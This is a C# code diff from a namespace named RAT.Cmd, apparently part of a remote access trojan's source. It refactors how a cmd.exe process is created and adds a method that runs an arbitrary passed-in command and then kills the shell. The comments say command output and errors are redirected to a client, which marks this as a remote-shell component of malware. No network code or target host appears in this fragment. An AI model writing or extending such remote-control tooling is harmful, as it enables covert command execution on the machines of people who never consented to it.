@@ -27,12 +27,42 @@ namespace RAT.Cmd
         }
 
         /// <summary>
+        /// Creates process only to execute passed in command.
+        /// </summary>
+        public void CreateCmdExecuteCommandAndKillCmd(string command)
+        {
+            var cmdProcess = this.GetBasicCmdProcess();
+            cmdProcess.Start();
+            cmdProcess.StandardInput.WriteLine(command);
+            cmdProcess.Kill();
+        }
+
+        /// <summary>
         /// Creates and configures new cmd process.
         /// </summary>
         /// <returns>Launched cmd process.</returns>
         public Process CreateNewCmdProcess()
         {
-            var cmdProcess = new Process()
+            var cmdProcess = this.GetBasicCmdProcess();
+
+            // Cmd output handler which will redirect output and error result to client after command is executed.
+            cmdProcess.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            cmdProcess.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+
+            // Launch cmd process.
+            cmdProcess.Start();
+            cmdProcess.BeginOutputReadLine();
+            cmdProcess.BeginErrorReadLine();
+            return cmdProcess;
+        }
+
+        /// <summary>
+        /// Gets basic cmd process with basic configuration.
+        /// </summary>
+        /// <returns>Configured unlaunched cmd process.</returns>
+        private Process GetBasicCmdProcess()
+        {
+            return new Process()
             {
                 StartInfo = new ProcessStartInfo()
                 {
@@ -44,16 +74,6 @@ namespace RAT.Cmd
                     StandardOutputEncoding = Encoding.ASCII,
                 },
             };
-
-            // Cmd output handler which will redirect output and error result to client after command is executed.
-            cmdProcess.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-            cmdProcess.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-
-            // Launch cmd process.
-            cmdProcess.Start();
-            cmdProcess.BeginOutputReadLine();
-            cmdProcess.BeginErrorReadLine();
-            return cmdProcess;
         }
 
         /// <summary>
